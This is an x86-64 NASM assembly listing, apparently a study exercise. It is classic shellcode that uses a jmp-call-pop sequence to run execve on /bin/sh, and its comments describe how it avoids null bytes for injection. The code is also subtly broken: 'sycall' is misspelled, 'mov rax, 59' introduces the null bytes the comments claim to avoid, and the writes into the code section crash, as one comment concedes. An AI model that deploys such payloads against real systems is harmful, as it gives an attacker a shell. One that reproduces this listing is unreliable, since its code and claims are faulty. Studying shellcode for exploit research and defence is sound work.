section .text
global _start
_start:

  jmp short two     ; 'jmp short' avoids null byte for shell code
                    ; jumping forward allows to make call backward,
                    ; also avoiding null bytes 
one:
  pop rbx           ; address of data in rbx
  xor rax, rax      ; rax = 0 (not about efficiency: avoid null bytes)
  mov [rbx+7], al   ; Null terminate the string /bin/sh  (Segmentation fault !!!)
  mov [rbx+8], rbx  ; address of string where AAAAAAAA is
  mov [rbx+16], rax ; Null pointer where BBBBBBBB is
  mov rax, 59       ; sys_execve 64 bits (see /usr/include/asm/unistd_64.h)
  mov rdi, rbx      ; filename
  lea rsi, [rbx+8]  ; address of argv ('mov rsi, rbx+8' not valid assembly)
  lea rdx, [rbx+16] ; address of envp ('mov rdx, rbx+16' not vald assembly)
  sycall            ; execve(filename, argv, envp)
  
two:
  call one          ; address of data now on the stack
  db "/bin/shXAAAAAAAABBBBBBBB"
